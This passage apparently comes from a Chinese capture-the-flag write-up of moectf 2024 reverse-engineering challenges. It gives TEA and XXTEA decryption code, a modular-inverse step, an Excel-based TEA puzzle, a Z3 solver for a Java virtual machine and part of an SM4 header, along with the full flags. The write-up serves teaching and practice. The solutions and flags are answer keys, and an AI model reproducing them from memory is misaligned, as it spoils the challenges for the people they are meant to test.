class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123; <span class="number">0x64</span>,<span class="number">0xf5</span>,<span class="number">0xe1</span>,<span class="number">0x78</span>,<span class="number">0xe1</span>,<span class="number">0xf0</span>,</span><br><span class="line"><span class="number">0x35</span>,<span class="number">0xa8</span>,<span class="number">0x34</span>,<span class="number">0xff</span>,<span class="number">0x12</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0x13</span>,<span class="number">0xe9</span>,<span class="number">0xb0</span>,<span class="number">0x50</span>,<span class="number">0xa3</span>,</span><br><span class="line"><span class="number">0xb9</span>,<span class="number">0x89</span>,<span class="number">0xb1</span>,<span class="number">0xda</span>,<span class="number">0x43</span>,<span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xc8</span>,<span class="number">0xdb</span>,<span class="number">0x01</span>,<span class="number">0x20</span>,<span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0x16</span>,<span class="number">0xaf</span>,<span class="number">0xed</span>,<span class="number">0x67</span>,<span class="number">0x17</span>,<span class="number">0x96</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> r = <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input_key[<span class="number">13</span>] = <span class="string">&quot;moectf2024!!&quot;</span>; <span class="comment">// Adjusted size to fit 12 characters + null terminator</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123; *((<span class="type">uint32_t</span>*)input_key),*((<span class="type">uint32_t</span>*)(input_key + <span class="number">4</span>)), *((<span class="type">uint32_t</span>*)(input_key + <span class="number">8</span>)),<span class="number">0xccffbbbb</span> &#125;;</span><br><span class="line">    <span class="built_in">btea</span>(((<span class="type">uint32_t</span>*)enc),-r,k);</span><br><span class="line">    <span class="comment">//moectf&#123;j9h8hg75nky6vhkslh5v5awibr4i&#125;</span></span><br><span class="line">    <span class="comment">//btea(((uint32_t*)input), -r, ((uint32_t*)input_key));</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选手只需要在网上找到xxtea实现并且对照逆向即可。<br><code>moectf&#123;j9h8hg75nky6vhkslh5v5awibr4i&#125;</code></p><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><p>本题是标准的TEA（难度低于XTEA和XXTEA），选手只需要打开IDA找到v &#x3D; {0x284c2234, 0x3910c558}, k &#x3D; “base64xorteaxtea”，再通过观察，对比程序内TEA和正常TEA逻辑相同，故写出解密脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">        <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">        <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">                v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">                v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">                sum -= delta;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v[<span class="number">0</span>] = v0;</span><br><span class="line">        v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>]; <span class="type">uint32_t</span> v2;</span><br><span class="line">        v[<span class="number">0</span>] = <span class="number">0x284c2234</span>;</span><br><span class="line">        v[<span class="number">1</span>] = <span class="number">0x3910c558</span>;</span><br><span class="line">        <span class="built_in">decrypt</span>(v, (<span class="type">uint32_t</span>*)<span class="string">&quot;base64xorteaxtea&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;moectf&#123;%x-&quot;</span>, v[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x-&quot;</span>, v[<span class="number">1</span>] &gt;&gt; <span class="number">16</span> );</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x-9c42-caf30620caaf&#125;&quot;</span>, v[<span class="number">1</span>] &amp; <span class="number">0xffff</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</code></p><h1 id="逆向工程进阶之北"><a href="#逆向工程进阶之北" class="headerlink" title="逆向工程进阶之北"></a>逆向工程进阶之北</h1><p>这个指北中的问题是，如何求解乘法逆元。<br>我们使用Python的库pycryptodome3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>inverse(<span class="number">0xccffbbbb</span>, <span class="number">0xffffffff</span>+<span class="number">1</span>) </span><br><span class="line"><span class="number">2371998067</span></span><br></pre></td></tr></table></figure><p>很容易就可以求得乘法逆元，注意的是要+1，是因为0xffffffff范围内还有0，而模数（第二个参数）取决于有限域的大小而不是最大值。<br>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">flag_decryption</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DWORD flag[<span class="number">12</span>] = &#123; <span class="number">0xb5073388</span> , <span class="number">0xf58ea46f</span> , <span class="number">0x8cd2d760</span> , <span class="number">0x7fc56cda</span> , <span class="number">0x52bc07da</span> , <span class="number">0x29054b48</span> , <span class="number">0x42d74750</span> , <span class="number">0x11297e95</span> , <span class="number">0x5cf2821b</span> , <span class="number">0x747970da</span> , <span class="number">0x64793c81</span>, <span class="number">0x00000000</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                *(flag + i) ^= <span class="number">0xdeadbeef</span> + <span class="number">0xd3906</span>;</span><br><span class="line">                *(flag + i) -= <span class="number">0xdeadc0de</span>;</span><br><span class="line">                *(flag + i) *= <span class="number">2371998067</span>; <span class="comment">// 0xccffbbbb 的乘法逆元（在mod 0xffffffff+1下） Ref: https://zh.planetcalc.com/3311/</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::cout &lt;&lt; (<span class="type">unsigned</span> <span class="type">char</span>*)flag &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// moectf&#123;c5f44c32-cbb9-444e-aef4-c0fa7c7a6b7a&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>moectf&#123;c5f44c32-cbb9-444e-aef4-c0fa7c7a6b7a&#125;</code></p><h1 id="moedaily"><a href="#moedaily" class="headerlink" title="moedaily"></a>moedaily</h1><p>题目实现了一个Excel表格，利用其中的Function功能实现了一个TEA加密。<br>在表单可以发现有s3cr3t，进去后可以看到满屏的计算过程<br>进行分析，发现是密码为 114514 1919810 415144 19883<br>偏移为114514的标准TEA加密，而且加密了两次。<br>回到第一页，找到判断条件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=IF(LEN(D11)=48,IF(AND(AND(AND(AND(AND(AND(H14=1397140385,I14=2386659843),AND(H15=962571399,I15=3942687964)),AND(H16=3691974192,I16=863943258)),AND(H17=216887638,I17=3212824238)),AND(H18=3802077983,I18=1839161422)),AND(H19=1288683919,I19=3222915626)),&quot;恭喜你，拿到了真的FLAG&quot;,&quot;FLAG输入错了，再试试&quot;),&quot;flag长度不对&quot;)</span><br></pre></td></tr></table></figure><p>可以得到结论</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">H14=1397140385,I14=2386659843</span><br><span class="line">H15=962571399,I15=3942687964</span><br><span class="line">H16=3691974192,I16=863943258</span><br><span class="line">H17=216887638,I17=3212824238</span><br><span class="line">H18=3802077983,I18=1839161422</span><br><span class="line">H19=1288683919,I19=3222915626</span><br></pre></td></tr></table></figure><p>带入TEA可以得到（注意程序进行了两次TEA加密）<br><code>moectf&#123;3xC3l_1S_n0t_just_f0r_d41ly_w0rk_bu7_R3V&#125;</code></p><h1 id="moejvav"><a href="#moejvav" class="headerlink" title="moejvav"></a>moejvav</h1><p>题目是在Java下的简单虚拟机（vm）逆向工程。<br>稍微分析一下，得到下面的结论</p><table><thead><tr><th>Step</th><th>Instruction</th></tr></thead><tbody><tr><td>0</td><td>getByte</td></tr><tr><td>1</td><td>xor store, p1</td></tr><tr><td>2</td><td>add store, p1</td></tr><tr><td>3</td><td>sub store, p1</td></tr><tr><td>4</td><td>shl store, p1</td></tr><tr><td>5</td><td>or store, p1</td></tr><tr><td>6</td><td>check store, p1</td></tr><tr><td>7</td><td>Exit</td></tr><tr><td>把VM的Insn进行排列</td><td></td></tr></tbody></table><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0 1 60 2 -20 6 -25</span><br><span class="line">0 1 60 2 -20 6 -27</span><br><span class="line">0 1 60 2 -20 6 -33</span><br><span class="line">0 1 60 2 -20 6 -31</span><br><span class="line">0 1 60 2 -20 6 -50</span><br><span class="line">0 1 60 2 -20 6 -36</span><br><span class="line">0 1 60 2 -20 6 -39</span><br><span class="line">0 1 60 2 -20 6 -24</span><br><span class="line">0 1 60 2 -20 6 -52</span><br><span class="line">0 1 60 2 -20 6 -29</span><br><span class="line">0 1 60 2 -20 6 -52</span><br><span class="line">0 1 14 2 5 6 -64</span><br><span class="line">0 1 14 2 5 6 -58</span><br><span class="line">0 1 14 2 5 6 -63</span><br><span class="line">0 1 14 2 5 6 -52</span><br><span class="line">0 1 14 2 5 6 -90</span><br><span class="line">0 1 14 2 5 6 -39</span><br><span class="line">0 1 14 2 5 6 -43</span><br><span class="line">0 1 14 2 5 6 26</span><br><span class="line">0 1 14 2 5 6 25</span><br><span class="line">0 1 14 2 5 6 -49</span><br><span class="line">0 1 14 2 5 6 -64</span><br><span class="line">0 1 10 2 5 6 -51</span><br><span class="line">0 1 10 2 5 6 25</span><br><span class="line">0 1 10 2 5 6 -45</span><br><span class="line">0 1 10 2 5 6 -55</span><br><span class="line">0 1 10 2 5 6 -47</span><br><span class="line">0 1 10 2 5 6 24</span><br><span class="line">0 1 10 2 5 6 -41</span><br><span class="line">0 1 10 2 5 6 -60</span><br><span class="line">0 1 10 2 5 6 22</span><br><span class="line">0 1 10 2 5 6 -40</span><br><span class="line">0 1 10 2 5 6 -60</span><br><span class="line">0 2 14 2 10 6 -15</span><br><span class="line">0 2 14 2 10 6 50</span><br><span class="line">0 2 14 2 10 6 -51</span><br><span class="line">0 2 14 2 10 6 -31</span><br><span class="line">0 2 14 2 10 6 50</span><br><span class="line">0 2 14 2 10 6 50</span><br><span class="line">0 2 14 2 10 6 -35</span><br><span class="line">0 2 14 2 10 6 50</span><br><span class="line">0 2 14 2 10 6 -35</span><br><span class="line">0 2 14 2 10 6 51</span><br><span class="line">0 2 14 2 10 6 -17</span><br></pre></td></tr></table></figure><p>这里我们使用Z3-Solver进行约束求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">x = [BitVec(<span class="string">f&quot;x<span class="subst">&#123;i&#125;</span>&quot;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>)]</span><br><span class="line">y = copy.deepcopy(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">   x[i] ^= <span class="number">0xca</span></span><br><span class="line">   x[i] += <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">ans1 = [-<span class="number">25</span>,-<span class="number">27</span>,-<span class="number">33</span>,-<span class="number">31</span>,-<span class="number">50</span>,-<span class="number">36</span>,-<span class="number">39</span>,-<span class="number">24</span>,-<span class="number">52</span>,-<span class="number">29</span>,-<span class="number">52</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">   s.add((x[i] ^ <span class="number">60</span>) - <span class="number">20</span> == ans1[i]) </span><br><span class="line"></span><br><span class="line">ans2 = [-<span class="number">64</span>,-<span class="number">58</span>,-<span class="number">63</span>,-<span class="number">52</span>,-<span class="number">90</span>,-<span class="number">39</span>,-<span class="number">43</span>,<span class="number">26</span>,<span class="number">25</span>,-<span class="number">49</span>,-<span class="number">64</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">   s.add((x[<span class="number">11</span> + i] ^ <span class="number">14</span>) + <span class="number">5</span> == ans2[i]) </span><br><span class="line"></span><br><span class="line">ans3 = [-<span class="number">51</span>,<span class="number">25</span>,-<span class="number">45</span>,-<span class="number">55</span>,-<span class="number">47</span>,<span class="number">24</span>,-<span class="number">41</span>,-<span class="number">60</span>,<span class="number">22</span>,-<span class="number">40</span>,-<span class="number">60</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">   s.add((x[<span class="number">22</span> + i] ^ <span class="number">10</span>) + <span class="number">5</span> == ans3[i]) </span><br><span class="line"></span><br><span class="line">ans4 = [-<span class="number">15</span>,<span class="number">50</span>,-<span class="number">51</span>,-<span class="number">31</span>,<span class="number">50</span>,<span class="number">50</span>,-<span class="number">35</span>,<span class="number">50</span>,-<span class="number">35</span>,<span class="number">51</span>,-<span class="number">17</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">   s.add((x[<span class="number">33</span> + i] + <span class="number">14</span>) + <span class="number">10</span> == ans4[i]) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> y:</span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">chr</span>(m[i].as_long()), end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="comment"># sat</span></span><br><span class="line"><span class="comment"># moectf&#123;jvav_eXcEpt10n_h4ndl3r_1s_s0_c00o0o1&#125;</span></span><br></pre></td></tr></table></figure><p><code>moectf&#123;jvav_eXcEpt10n_h4ndl3r_1s_s0_c00o0o1&#125;</code></p><h1 id="sm4"><a href="#sm4" class="headerlink" title="sm4"></a>sm4</h1><p>题目头文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _SM4_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _SM4_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u8 unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u32 unsigned long</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">four_uCh2uLong</span><span class="params">(u8 *in, u32 *out)</span>;             <span class="comment">//四字节转换成u32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uLong2four_uCh</span><span class="params">(u32 in, u8 *out)</span>;              <span class="comment">//u32转换成四字节</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">move</span><span class="params">(u32 data, <span class="type">int</span> length)</span>;          <span class="comment">//左移，保留丢弃位放置尾部</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">func_key</span><span class="params">(u32 input)</span>;                 <span class="comment">//先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">func_data</span><span class="params">(u32 input)</span>;                <span class="comment">//先使用Sbox进行非线性变化，再进行线性变换L</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(u8 *data, <span class="type">int</span> len)</span>;                 <span class="comment">//无符号字符数组转16进制打印</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encode_fun</span><span class="params">(u8 len,u8 *key, u8 *input, u8 *output)</span>;   <span class="comment">//加密函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode_fun</span><span class="params">(u8 len,u8 *key, u8 *input, u8 *output)</span>;   <span class="comment">//解密函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************定义系统参数FK的取值****************************************/</span></span><br><span class="line"><span class="type">const</span> u32 TBL_SYS_PARAMS[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0xa3b1bac6</span>,</span><br><span class="line">        <span class="number">0x56aa3350</span>,</span><br><span class="line">        <span class="number">0x677d9197</span>,</span><br><span class="line">        <span class="number">0xb27022dc</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************定义固定参数CK的取值****************************************/</span></span><br><span class="line"><span class="type">const</span> u32 TBL_FIX_PARAMS[<span class="number">32</span>] = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line">        <span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line">        <span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line">        <span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line">        <span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line">        <span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line">        <span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line">        <span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************SBox参数列表****************************************/</span></span><br><span class="line"><span class="type">const</span> u8 TBL_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line">        <span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line">        <span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line">        <span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line">        <span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line">        <span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line">        <span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line">        <span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line">        <span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span 